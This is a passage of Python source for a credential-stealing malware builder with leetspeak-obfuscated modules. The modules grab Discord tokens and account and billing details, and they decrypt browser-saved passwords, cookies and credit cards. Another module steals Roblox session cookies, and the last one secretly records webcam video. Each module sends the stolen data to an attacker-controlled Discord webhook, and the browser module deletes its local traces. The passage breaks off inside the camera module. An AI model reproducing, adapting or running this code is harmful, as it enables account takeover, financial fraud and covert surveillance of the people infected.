                                        v4r_uids.append(v4r_uid)
                                        v4r_token_info[v4r_t0k3n] = (v4r_name, f"{v4r_path}\\{v4r_file_name}")
            else:
                for v4r_file_name in os.listdir(v4r_path):
                    if v4r_file_name[-3:] not in ["log", "ldb"]:
                        continue
                    with open(f'{v4r_path}\\{v4r_file_name}', errors='ignore') as v4r_file:
                        for v4r_line in v4r_file:
                            for v4r_t0k3n in re.findall(v4r_regexp, v4r_line.strip()):
                                if validate_t0k3n(v4r_t0k3n, v4r_base_url):
                                    v4r_uid = requests.get(v4r_base_url, headers={'Authorization': v4r_t0k3n}).json()['id']
                                    if v4r_uid not in v4r_uids:
                                        v4r_t0k3n5.append(v4r_t0k3n)
                                        v4r_uids.append(v4r_uid)
                                        v4r_token_info[v4r_t0k3n] = (v4r_name, f"{v4r_path}\\{v4r_file_name}")

        if os.path.exists(v4r_appdata_roaming + "\\Mozilla\\Firefox\\Profiles"):
            for v4r_path, _, v4r_files in os.walk(v4r_appdata_roaming + "\\Mozilla\\Firefox\\Profiles"):
                for v4r__file in v4r_files:
                    if v4r__file.endswith('.sqlite'):
                        with open(f'{v4r_path}\\{v4r__file}', errors='ignore') as v4r_file:
                            for v4r_line in v4r_file:
                                for v4r_t0k3n in re.findall(v4r_regexp, v4r_line.strip()):
                                    if validate_t0k3n(v4r_t0k3n, v4r_base_url):
                                        v4r_uid = requests.get(v4r_base_url, headers={'Authorization': v4r_t0k3n}).json()['id']
                                        if v4r_uid not in v4r_uids:
                                            v4r_t0k3n5.append(v4r_t0k3n)
                                            v4r_uids.append(v4r_uid)
                                            v4r_token_info[v4r_t0k3n] = ('Firefox', f"{v4r_path}\\{v4r__file}")
        return v4r_t0k3n5, v4r_token_info

    def validate_t0k3n(v4r_t0k3n, v4r_base_url):
        return requests.get(v4r_base_url, headers={'Authorization': v4r_t0k3n}).status_code == 200

    def decrypt_val(v4r_buff, v4r_master_key):
        v4r_iv = v4r_buff[3:15]
        v4r_payload = v4r_buff[15:]
        v4r_cipher = AES.new(v4r_master_key, AES.MODE_GCM, v4r_iv)
        return v4r_cipher.decrypt(v4r_payload)[:-16].decode()

    def get_master_key(v4r_path):
        if not os.path.exists(v4r_path):
            return None
        with open(v4r_path, "r", encoding="utf-8") as v4r_f:
            v4r_local_state = json.load(v4r_f)
        v4r_master_key = base64.b64decode(v4r_local_state["os_crypt"]["encrypted_key"])[5:]
        return CryptUnprotectData(v4r_master_key, None, None, None, 0)[1]

    def upload_t0k3n5():
        v4r_t0k3n5, v4r_token_info = extr4ct_t0k3n5()
        v4r_w3bh00k = SyncWebhook.from_url(v4r_w3bh00k_ur1)

        if not v4r_t0k3n5:
            v4r_embed = Embed(
                title=f'Discord Token `{v4r_username_pc} "{v4r_ip_address_public}"`:', 
                description=f"No discord tokens found.",
                color=v4r_color_embed)
            v4r_embed.set_footer(text=v4r_footer_text, icon_url=v4r_avatar_embed)
            v4r_w3bh00k.send(embed=v4r_embed, username=v4r_username_embed, avatar_url=v4r_avatar_embed)
            return
        
        for v4r_t0k3n_d15c0rd in v4r_t0k3n5:
            v4r_api = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': v4r_t0k3n_d15c0rd}).json()

            v4r_u53rn4m3_d15c0rd = v4r_api.get('username', "None") + '#' + v4r_api.get('discriminator', "None")
            v4r_d15pl4y_n4m3_d15c0rd = v4r_api.get('global_name', "None")
            v4r_us3r_1d_d15c0rd = v4r_api.get('id', "None")
            v4r_em4i1_d15c0rd = v4r_api.get('email', "None")
            v4r_em4il_v3rifi3d_d15c0rd = v4r_api.get('verified', "None")
            v4r_ph0n3_d15c0rd = v4r_api.get('phone', "None")
            v4r_c0untry_d15c0rd = v4r_api.get('locale', "None")
            v4r_mf4_d15c0rd = v4r_api.get('mfa_enabled', "None")

            try:
                if v4r_api.get('premium_type', 'None') == 0:
                    v4r_n1tr0_d15c0rd = 'False'
                elif v4r_api.get('premium_type', 'None') == 1:
                    v4r_n1tr0_d15c0rd = 'Nitro Classic'
                elif v4r_api.get('premium_type', 'None') == 2:
                    v4r_n1tr0_d15c0rd = 'Nitro Boosts'
                elif v4r_api.get('premium_type', 'None') == 3:
                    v4r_n1tr0_d15c0rd = 'Nitro Basic'
                else:
                    v4r_n1tr0_d15c0rd = 'False'
            except:
                v4r_n1tr0_d15c0rd = "None"

            try: 
                v4r_av4t4r_ur1_d15c0rd = f"https://cdn.discordapp.com/avatars/{v4r_us3r_1d_d15c0rd}/{v4r_api['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{v4r_us3r_1d_d15c0rd}/{v4r_api['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{v4r_us3r_1d_d15c0rd}/{v4r_api['avatar']}.png"
            except: 
                v4r_av4t4r_ur1_d15c0rd = v4r_avatar_embed

            try:
                v4r_billing_discord = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': v4r_t0k3n_d15c0rd}).json()
                if v4r_billing_discord:
                    v4r_p4ym3nt_m3th0d5_d15c0rd = []

                    for v4r_method in v4r_billing_discord:
                        if v4r_method['type'] == 1:
                            v4r_p4ym3nt_m3th0d5_d15c0rd.append('CB')
                        elif v4r_method['type'] == 2:
                            v4r_p4ym3nt_m3th0d5_d15c0rd.append("Paypal")
                        else:
                            v4r_p4ym3nt_m3th0d5_d15c0rd.append('Other')
                    v4r_p4ym3nt_m3th0d5_d15c0rd = ' / '.join(v4r_p4ym3nt_m3th0d5_d15c0rd)
                else:
                    v4r_p4ym3nt_m3th0d5_d15c0rd = "None"
            except:
                v4r_p4ym3nt_m3th0d5_d15c0rd = "None"

            try:
                v4r_gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': v4r_t0k3n_d15c0rd}).json()
                if v4r_gift_codes:
                    v4r_codes = []
                    for v4r_g1ft_c0d35_d15c0rd in v4r_gift_codes:
                        v4r_name = v4r_g1ft_c0d35_d15c0rd['promotion']['outbound_title']
                        v4r_g1ft_c0d35_d15c0rd = v4r_g1ft_c0d35_d15c0rd['code']
                        v4r_data = f"Gift: {v4r_name}\nCode: {v4r_g1ft_c0d35_d15c0rd}"
                        if len('\n\n'.join(v4r_g1ft_c0d35_d15c0rd)) + len(v4r_data) >= 1024:
                            break
                        v4r_codes.append(v4r_data)
                    if len(v4r_codes) > 0:
                        v4r_g1ft_c0d35_d15c0rd = '\n\n'.join(v4r_codes)
                    else:
                        v4r_g1ft_c0d35_d15c0rd = "None"
                else:
                    v4r_g1ft_c0d35_d15c0rd = "None"
            except:
                v4r_g1ft_c0d35_d15c0rd = "None"
        
            v4r_software_name, v4r_path = v4r_token_info.get(v4r_t0k3n_d15c0rd, ("Unknown Software", "Unknown location"))

            embed = Embed(title=f'Discord Token `{v4r_username_pc} "{v4r_ip_address_public}"`:', color=v4r_color_embed)      
            embed.add_field(name=":file_folder: Path:", value=f"```{v4r_path}```", inline=True)
            embed.add_field(name=":globe_with_meridians: Token:", value=f"```{v4r_t0k3n_d15c0rd}```", inline=True)
            embed.add_field(name=":package: Software:", value=f"```{v4r_software_name}```", inline=True)
            embed.add_field(name=":bust_in_silhouette: Username:", value=f"```{v4r_u53rn4m3_d15c0rd}```", inline=True)
            embed.add_field(name=":bust_in_silhouette: Display Name:", value=f"```{v4r_d15pl4y_n4m3_d15c0rd}```", inline=True)
            embed.add_field(name=":robot: Id:", value=f"```{v4r_us3r_1d_d15c0rd}```", inline=True)
            embed.add_field(name=":e_mail: Email:", value=f"```{v4r_em4i1_d15c0rd}```", inline=True)
            embed.add_field(name=":white_check_mark: Email Verified:", value=f"```{v4r_em4il_v3rifi3d_d15c0rd}```", inline=True)
            embed.add_field(name=":telephone_receiver: Phone:", value=f"```{v4r_ph0n3_d15c0rd}```", inline=True)   
            embed.add_field(name=":rocket: Nitro:", value=f"```{v4r_n1tr0_d15c0rd}```", inline=True)
            embed.add_field(name=":earth_africa: Language:", value=f"```{v4r_c0untry_d15c0rd}```", inline=True)
            embed.add_field(name=":moneybag: Billing:", value=f"```{v4r_p4ym3nt_m3th0d5_d15c0rd}```", inline=True)
            embed.add_field(name=":gift: Gift Code:", value=f"```{v4r_g1ft_c0d35_d15c0rd}```", inline=True)
            embed.add_field(name=":lock: Multi-Factor Authentication:", value=f"```{v4r_mf4_d15c0rd}```", inline=True)
            embed.add_field(name=":frame_photo: Profile Picture:", value=f"", inline=False)
            embed.set_image(url=v4r_av4t4r_ur1_d15c0rd)
            embed.set_footer(text=v4r_footer_text, icon_url=v4r_avatar_embed)
            v4r_w3bh00k.send(embed=embed, username=v4r_username_embed, avatar_url=v4r_avatar_embed)

    upload_t0k3n5()
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

Br0w53r5t341 = r'''
def Br0w53r_5t341():
    import os
    import shutil
    import json
    import base64
    import sqlite3
    import win32crypt
    from zipfile import ZipFile
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from discord import SyncWebhook, Embed, File
    from pathlib import Path

    v4r_PASSWORDS = []
    v4r_COOKIES = []
    v4r_HISTORY = []
    v4r_DOWNLOADS = []
    v4r_CARDS = []
    v4r_browsers = []

    def Br0ws53r_Main():
        v4r_appdata_local = os.getenv('LOCALAPPDATA')
        v4r_appdata_roaming = os.getenv('APPDATA')
        v4r_w3bh00k = SyncWebhook.from_url(v4r_w3bh00k_ur1)
            

        v4r_Browser = {
            'Google Chrome': os.path.join(v4r_appdata_local, 'Google', 'Chrome', 'User Data'),
            'Microsoft Edge': os.path.join(v4r_appdata_local, 'Microsoft', 'Edge', 'User Data'),
            'Opera': os.path.join(v4r_appdata_roaming, 'Opera Software', 'Opera Stable'),
            'Opera GX': os.path.join(v4r_appdata_roaming, 'Opera Software', 'Opera GX Stable'),
            'Brave': os.path.join(v4r_appdata_local, 'BraveSoftware', 'Brave-Browser', 'User Data'),
            'Vivaldi': os.path.join(v4r_appdata_local, 'Vivaldi', 'User Data'),
            'Internet Explorer': os.path.join(v4r_appdata_local, 'Microsoft', 'Internet Explorer'),
            'Amigo': os.path.join(v4r_appdata_local, 'Amigo', 'User Data'),
            'Torch': os.path.join(v4r_appdata_local, 'Torch', 'User Data'),
            'Kometa': os.path.join(v4r_appdata_local, 'Kometa', 'User Data'),
            'Orbitum': os.path.join(v4r_appdata_local, 'Orbitum', 'User Data'),
            'Cent Browser': os.path.join(v4r_appdata_local, 'CentBrowser', 'User Data'),
            '7Star': os.path.join(v4r_appdata_local, '7Star', '7Star', 'User Data'),
            'Sputnik': os.path.join(v4r_appdata_local, 'Sputnik', 'Sputnik', 'User Data'),
            'Vivaldi': os.path.join(v4r_appdata_local, 'Vivaldi', 'User Data'),
            'Google Chrome SxS': os.path.join(v4r_appdata_local, 'Google', 'Chrome SxS', 'User Data'),
            'Epic Privacy Browser': os.path.join(v4r_appdata_local, 'Epic Privacy Browser', 'User Data'),
            'Uran': os.path.join(v4r_appdata_local, 'uCozMedia', 'Uran', 'User Data'),
            'Yandex': os.path.join(v4r_appdata_local, 'Yandex', 'YandexBrowser', 'User Data'),
            'Iridium': os.path.join(v4r_appdata_local, 'Iridium', 'User Data'),
            'Mozilla Firefox': os.path.join(v4r_appdata_roaming, 'Mozilla', 'Firefox', 'Profiles'),
            'Safari': os.path.join(v4r_appdata_roaming, 'Apple Computer', 'Safari'),
        }

        v4r_profiles = [
            '', 'Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5'
        ]

        for v4r_browser, v4r_path in v4r_Browser.items():
            if not os.path.exists(v4r_path):
                continue

            v4r_master_key = get_master_key(os.path.join(v4r_path, 'Local State'))
            if not v4r_master_key:
                continue

            for v4r_profile in v4r_profiles:
                v4r_profile_path = os.path.join(v4r_path, v4r_profile)
                if not os.path.exists(v4r_profile_path):
                    continue

                get_passwords(v4r_browser, v4r_path, v4r_profile_path, v4r_master_key)
                get_cookies(v4r_browser, v4r_path, v4r_profile_path, v4r_master_key)
                get_history(v4r_browser, v4r_path, v4r_profile_path)
                get_downloads(v4r_browser, v4r_path, v4r_profile_path)
                get_cards(v4r_browser, v4r_path, v4r_profile_path, v4r_master_key)

                if v4r_browser not in v4r_browsers:
                    v4r_browsers.append(v4r_browser)

        write_files(v4r_username_pc)
        send_files(v4r_username_pc, v4r_w3bh00k)
        clean_files(v4r_username_pc)

    def get_master_key(v4r_path):
        if not os.path.exists(v4r_path):
            return None

        try:
            with open(v4r_path, 'r', encoding='utf-8') as v4r_f:
                v4r_local_state = json.load(v4r_f)

            v4r_encrypted_key = base64.b64decode(v4r_local_state["os_crypt"]["encrypted_key"])[5:]
            v4r_master_key = win32crypt.CryptUnprotectData(v4r_encrypted_key, None, None, None, 0)[1]
            return v4r_master_key
        except:
            return None

    def decrypt_password(v4r_buff, v4r_master_key):
        try:
            v4r_iv = v4r_buff[3:15]
            v4r_payload = v4r_buff[15:-16]
            v4r_tag = v4r_buff[-16:]
            v4r_cipher = Cipher(algorithms.AES(v4r_master_key), modes.GCM(v4r_iv, v4r_tag))
            v4r_decryptor = v4r_cipher.decryptor()
            v4r_decrypted_pass = v4r_decryptor.update(v4r_payload) + v4r_decryptor.finalize()
            return v4r_decrypted_pass.decode()
        except:
            return None

    def list_tables(v4r_db_path):
        try:
            v4r_conn = sqlite3.connect(v4r_db_path)
            v4r_cursor = v4r_conn.cursor()
            v4r_cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
            v4r_tables = v4r_cursor.fetchall()
            v4r_conn.close()
            return v4r_tables
        except:
            return []

    def get_passwords(v4r_browser, v4r_path, v4r_profile_path, v4r_master_key):
        v4r_password_db = os.path.join(v4r_profile_path, 'Login Data')
        if not os.path.exists(v4r_password_db):
            return

        shutil.copy(v4r_password_db, 'password_db')
        v4r_tables = list_tables('password_db')

        v4r_conn = sqlite3.connect('password_db')
        v4r_cursor = v4r_conn.cursor()

        try:
            v4r_cursor.execute('SELECT action_url, username_value, password_value FROM logins')
            v4r_PASSWORDS.append(f"\n------------------------------| {v4r_browser} ({v4r_path}) |------------------------------\n")
            for v4r_row in v4r_cursor.fetchall():
                if not v4r_row[0] or not v4r_row[1] or not v4r_row[2]:
                    continue
                v4r_url =      f"- Url      : {v4r_row[0]}"
                v4r_username = f"  Username : {v4r_row[1]}"
                v4r_password = f"  Password : {decrypt_password(v4r_row[2], v4r_master_key)}"
                v4r_PASSWORDS.append(f"{v4r_url}\n{v4r_username}\n{v4r_password}\n")
        except:
            pass
        finally:
            v4r_conn.close()
            os.remove('password_db')

    def get_cookies(v4r_browser, v4r_path, v4r_profile_path, v4r_master_key):
        v4r_cookie_db = os.path.join(v4r_profile_path, 'Network', 'Cookies')
        if not os.path.exists(v4r_cookie_db):
            return

        v4r_conn = None 
        try:
            shutil.copy(v4r_cookie_db, 'cookie_db')
            v4r_conn = sqlite3.connect('cookie_db')
            v4r_cursor = v4r_conn.cursor()
            v4r_cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')
            v4r_COOKIES.append(f"\n------------------------------| {v4r_browser} ({v4r_path}) |------------------------------\n")
            for v4r_row in v4r_cursor.fetchall():
                if not v4r_row[0] or not v4r_row[1] or not v4r_row[2] or not v4r_row[3]:
                    continue
                v4r_url =    f"- Url    : {v4r_row[0]}"
                v4r_name =   f"  Name   : {v4r_row[1]}"
                v4r_path =   f"  Path   : {v4r_row[2]}"
                v4r_cookie = f"  Cookie : {decrypt_password(v4r_row[3], v4r_master_key)}"
                v4r_expire = f"  Expire : {v4r_row[4]}"
                v4r_COOKIES.append(f"{v4r_url}\n{v4r_name}\n{v4r_path}\n{v4r_cookie}\n{v4r_expire}\n")
        except:
            pass
        finally:
            if v4r_conn:
                v4r_conn.close()
            try:
                os.remove('cookie_db')
            except:
                pass


    def get_history(v4r_browser, v4r_path, v4r_profile_path):
        v4r_history_db = os.path.join(v4r_profile_path, 'History')
        if not os.path.exists(v4r_history_db):
            return

        shutil.copy(v4r_history_db, 'history_db')
        v4r_conn = sqlite3.connect('history_db')
        v4r_cursor = v4r_conn.cursor()
        v4r_cursor.execute('SELECT url, title, last_visit_time FROM urls')
        v4r_HISTORY.append(f"\n------------------------------| {v4r_browser} ({v4r_path}) |------------------------------\n")
        for v4r_row in v4r_cursor.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2]:
                continue
            v4r_url =   f"- Url   : {v4r_row[0]}"
            v4r_title = f"  Title : {v4r_row[1]}"
            v4r_time =  f"  Time  : {v4r_row[2]}"
            v4r_HISTORY.append(f"{v4r_url}\n{v4r_title}\n{v4r_time}\n")

        v4r_conn.close()
        os.remove('history_db')

    def get_downloads(v4r_browser, v4r_path, v4r_profile_path):
        v4r_downloads_db = os.path.join(v4r_profile_path, 'History')
        if not os.path.exists(v4r_downloads_db):
            return

        shutil.copy(v4r_downloads_db, 'downloads_db')
        v4r_conn = sqlite3.connect('downloads_db')
        v4r_cursor = v4r_conn.cursor()
        v4r_cursor.execute('SELECT tab_url, target_path FROM downloads')
        v4r_DOWNLOADS.append(f"\n------------------------------| {v4r_browser} ({v4r_path}) |------------------------------\n")
        for row in v4r_cursor.fetchall():
            if not row[0] or not row[1]:
                continue
            v4r_path = f"- Path : {row[1]}"
            v4r_url =  f"  Url  : {row[0]}"
            v4r_DOWNLOADS.append(f"{v4r_path}\n{v4r_url}\n")

        v4r_conn.close()
        os.remove('downloads_db')

    def get_cards(v4r_browser, v4r_path, v4r_profile_path, v4r_master_key):
        v4r_cards_db = os.path.join(v4r_profile_path, 'Web Data')
        if not os.path.exists(v4r_cards_db):
            return

        shutil.copy(v4r_cards_db, 'cards_db')
        v4r_conn = sqlite3.connect('cards_db')
        v4r_cursor = v4r_conn.cursor()
        v4r_cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
        v4r_CARDS.append(f"\n------------------------------| {v4r_browser} ({v4r_path}) |------------------------------\n")
        for v4r_row in v4r_cursor.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2] or not v4r_row[3]:
                continue
            v4r_name =             f"- Name             : {v4r_row[0]}"
            v4r_expiration_month = f"  Expiration Month : {v4r_row[1]}"
            v4r_expiration_year =  f"  Expiration Year  : {v4r_row[2]}"
            v4r_card_number =      f"  Card Number      : {decrypt_password(v4r_row[3], v4r_master_key)}"
            v4r_date_modified =    f"  Date Modified    : {v4r_row[4]}"
            v4r_CARDS.append(f"{v4r_name}\n{v4r_expiration_month}\n{v4r_expiration_year}\n{v4r_card_number}\n{v4r_date_modified}\n")

        v4r_conn.close()
        os.remove('cards_db')

    def write_files(v4r_username_pc):
        os.makedirs(f"Browser_{v4r_username_pc}", exist_ok=True)

        if v4r_PASSWORDS:
            with open(f"Browser_{v4r_username_pc}\\Passwords_{v4r_username_pc}.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(v4r_PASSWORDS))

        if v4r_COOKIES:
            with open(f"Browser_{v4r_username_pc}\\Cookies_{v4r_username_pc}.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(v4r_COOKIES))

        if v4r_HISTORY:
            with open(f"Browser_{v4r_username_pc}\\History_{v4r_username_pc}.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(v4r_HISTORY))

        if v4r_DOWNLOADS:
            with open(f"Browser_{v4r_username_pc}\\Downloads_{v4r_username_pc}.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(v4r_DOWNLOADS))

        if v4r_CARDS:
            with open(f"Browser_{v4r_username_pc}\\Cards_{v4r_username_pc}.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(v4r_CARDS))

        with ZipFile(f"Browser_{v4r_username_pc}.zip", "w") as zipf:
            for v4r_file in os.listdir(f"Browser_{v4r_username_pc}"):
                zipf.write(os.path.join(f"Browser_{v4r_username_pc}", v4r_file), v4r_file)

    def send_files(v4r_username_pc, v4r_w3bh00k):
        v4r_w3bh00k.send(
            embed=Embed(
                title=f'Browser Steal  `{v4r_username_pc} "{v4r_ip_address_public}"`:',
                description=f"Found In **{'**, **'.join(v4r_browsers)}**:```" + '\n'.join(tree(Path(f"Browser_{v4r_username_pc}"))) + "```",
                color=v4r_color_embed,
            ).set_footer(
                text=v4r_footer_text,
                icon_url=v4r_avatar_embed
            ),
            file=File(fp=f"Browser_{v4r_username_pc}.zip", filename=f"Browser_{v4r_username_pc}.zip"), username=v4r_username_embed, avatar_url=v4r_avatar_embed
        )

    def clean_files(v4r_username_pc):
        shutil.rmtree(f"Browser_{v4r_username_pc}")
        os.remove(f"Browser_{v4r_username_pc}.zip")

    def tree(v4r_path: Path, v4r_prefix: str = '', v4r_midfix_folder: str = '📂 - ', v4r_midfix_file: str = '📄 - '):
        v4r_pipes = {
            'space':  '    ',
            'branch': '│   ',
            'tee':    '├── ',
            'last':   '└── ',
        }

        if v4r_prefix == '':
            yield v4r_midfix_folder + v4r_path.name

        contents = list(v4r_path.iterdir())
        pointers = [v4r_pipes['tee']] * (len(contents) - 1) + [v4r_pipes['last']]
        for v4r_pointer, v4r_path in zip(pointers, contents):
            if v4r_path.is_dir():
                yield f"{v4r_prefix}{v4r_pointer}{v4r_midfix_folder}{v4r_path.name} ({len(list(v4r_path.glob('**/*')))} files, {sum(f.stat().st_size for f in v4r_path.glob('**/*') if f.is_file()) / 1024:.2f} kb)"
                v4r_extension = v4r_pipes['branch'] if v4r_pointer == v4r_pipes['tee'] else v4r_pipes['space']
                yield from tree(v4r_path, prefix=v4r_prefix+v4r_extension)
            else:
                yield f"{v4r_prefix}{v4r_pointer}{v4r_midfix_file}{v4r_path.name} ({v4r_path.stat().st_size / 1024:.2f} kb)"
    Br0ws53r_Main()
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

R0b10xC00ki3 = r'''
def R0b10x_C00ki3():
    import browser_cookie3
    import requests
    import json
    from discord import SyncWebhook, Embed
    import discord

    v4r_c00ki35_list = []
    def g3t_c00ki3_4nd_n4vig4t0r(v4r_br0ws3r_functi0n):
        try:
            v4r_c00kie5 = v4r_br0ws3r_functi0n()
            v4r_c00kie5 = str(v4r_c00kie5)
            v4r_c00kie = v4r_c00kie5.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
            v4r_n4vigator = v4r_br0ws3r_functi0n.__name__
            return v4r_c00kie, v4r_n4vigator
        except:
            return None, None

    def Microsoft_Edge():
        return browser_cookie3.edge(domain_name="roblox.com")

    def Google_Chrome():
        return browser_cookie3.chrome(domain_name="roblox.com")

    def Firefox():
        return browser_cookie3.firefox(domain_name="roblox.com")

    def Opera():
        return browser_cookie3.opera(domain_name="roblox.com")
    
    def Opera_GX():
        return browser_cookie3.opera_gx(domain_name="roblox.com")

    def Safari():
        return browser_cookie3.safari(domain_name="roblox.com")

    def Brave():
        return browser_cookie3.brave(domain_name="roblox.com")

    v4r_br0ws3r5 = [Microsoft_Edge, Google_Chrome, Firefox, Opera, Opera_GX, Safari, Brave]
    for v4r_br0ws3r in v4r_br0ws3r5:
        v4r_c00ki3, v4r_n4vigator = g3t_c00ki3_4nd_n4vig4t0r(v4r_br0ws3r)
        if v4r_c00ki3:
            if v4r_c00ki3 not in v4r_c00ki35_list:
                v4r_c00ki35_list.append(v4r_c00ki3)
                try:
                    v4r_inf0 = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": v4r_c00ki3})
                    v4r_api = json.loads(v4r_inf0.text)
                except:
                    pass

                v4r_us3r_1d_r0b10x = v4r_api.get('id', "None")
                v4r_d1spl4y_nam3_r0b10x = v4r_api.get('displayName', "None")
                v4r_us3rn4m3_r0b10x = v4r_api.get('name', "None")
                v4r_r0bux_r0b10x = v4r_api.get("RobuxBalance", "None")
                v4r_pr3mium_r0b10x = v4r_api.get("IsPremium", "None")
                v4r_av4t4r_r0b10x = v4r_api.get("ThumbnailUrl", "None")
                v4r_bui1d3r5_c1ub_r0b10x = v4r_api.get("IsAnyBuildersClubMember", "None")
        
                v4r_size_c00ki3 = len(v4r_c00ki3)
                v4r_middle_c00ki3 = v4r_size_c00ki3 // 2
                v4r_c00ki3_part1 = v4r_c00ki3[:v4r_middle_c00ki3]
                v4r_c00ki3_part2 = v4r_c00ki3[v4r_middle_c00ki3:]

                v4r_w3bh00k = SyncWebhook.from_url(v4r_w3bh00k_ur1)

                v4r_embed = discord.Embed(
                    title=f'Roblox Cookie `{v4r_username_pc} "{v4r_ip_address_public}"`:',
                    color=v4r_color_embed
                )
                v4r_embed.set_footer(text=v4r_footer_text, icon_url=v4r_avatar_embed)
                v4r_embed.set_thumbnail(url=v4r_av4t4r_r0b10x)
                v4r_embed.add_field(name=":compass: Navigator:", value=f"```{v4r_n4vigator}```", inline=True)
                v4r_embed.add_field(name=":bust_in_silhouette: Username:", value=f"```{v4r_us3rn4m3_r0b10x}```", inline=True)
                v4r_embed.add_field(name=":bust_in_silhouette: DisplayName:", value=f"```{v4r_d1spl4y_nam3_r0b10x}```", inline=True)
                v4r_embed.add_field(name=":robot: Id:", value=f"```{v4r_us3r_1d_r0b10x}```", inline=True)
                v4r_embed.add_field(name=":moneybag: Robux:", value=f"```{v4r_r0bux_r0b10x}```", inline=True)
                v4r_embed.add_field(name=":tickets: Premium:", value=f"```{v4r_pr3mium_r0b10x}```", inline=True)
                v4r_embed.add_field(name=":construction_site: Builders Club:", value=f"```{v4r_bui1d3r5_c1ub_r0b10x}```", inline=True)
                v4r_embed.add_field(name=":cookie: Cookie Part 1:", value=f"```{v4r_c00ki3_part1}```", inline=False)
                v4r_embed.add_field(name=":cookie: Cookie Part 2:", value=f"```{v4r_c00ki3_part2}```", inline=False)

                v4r_w3bh00k.send(embed=v4r_embed, username=v4r_username_embed,
                                avatar_url=v4r_avatar_embed)
                
    if not v4r_c00ki35_list:
        v4r_w3bh00k = SyncWebhook.from_url(v4r_w3bh00k_ur1)
        v4r_embed = Embed(
            title=f'Roblox Cookie `{v4r_username_pc} "{v4r_ip_address_public}"`:', 
            description=f"No roblox cookie found.",
            color=v4r_color_embed)
        v4r_embed.set_footer(text=v4r_footer_text, icon_url=v4r_avatar_embed)
        v4r_w3bh00k.send(embed=v4r_embed, username=v4r_username_embed, avatar_url=v4r_avatar_embed)
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

C4m3r4C4ptur3 = r'''
def C4m3r4_C4ptur3():
    import os
    import cv2
    from discord import SyncWebhook, Embed, File
    from datetime import datetime

    try:
        from datetime import datetime
        v4r_name_file_capture = f"CameraCapture_{v4r_username_pc}.avi"
        v4r_time_capture = 10
        v4r_cap = cv2.VideoCapture(0)

        if not v4r_cap.isOpened():
            Clear()
            v4r_w3bh00k = SyncWebhook.from_url(v4r_w3bh00k_ur1)
            v4r_embed = Embed(
                title=f'Camera Capture `{v4r_username_pc} "{v4r_ip_address_public}"`:', 
                description=f"No camera found.",
                color=v4r_color_embed)
            v4r_embed.set_footer(text=v4r_footer_text, icon_url=v4r_avatar_embed)
            v4r_w3bh00k.send(embed=v4r_embed, username=v4r_username_embed, avatar_url=v4r_avatar_embed)
            return

        def c4ptur3(v4r_path_file_capture):
            v4r_fourcc = cv2.VideoWriter_fourcc(*'XVID')
            v4r_out = cv2.VideoWriter(v4r_path_file_capture, v4r_fourcc, 20.0, (640, 480))
            v4r_time_start = datetime.now()
            Clear()
            while (datetime.now() - v4r_time_start).seconds < v4r_time_capture:
                Clear()
                v4r_ret, v4r_frame = v4r_cap.read()
                if not v4r_ret:
                    Clear()
                    break
                v4r_out.write(v4r_frame)

            v4r_cap.release()
            v4r_out.release()
            Clear()

        try:
            v4r_path_file_capture = f"{os.path.join(os.environ.get('USERPROFILE'), 'Documents')}\\{v4r_name_file_capture}"
            c4ptur3(v4r_path_file_capture)
        except:
            v4r_path_file_capture = v4r_name_file_capture
            c4ptur3(v4r_path_file_capture)

        v4r_embed = Embed(title=f"Camera Capture `{v4r_username_pc} \"{v4r_ip_address_public}\"`:", color=v4r_color_embed, description=f"```└── 📷 - {v4r_name_file_capture}```")
        v4r_embed.set_footer(text=v4r_footer_text, icon_url=v4r_avatar_embed)

        v4r_w3bh00k = SyncWebhook.from_url(v4r_w3bh00k_ur1)
        with open(v4r_path_file_capture, "rb") as f:
            v4r_w3bh00k.send(
                embed=v4r_embed,
                file=File(f, filename=v4r_name_file_capture),
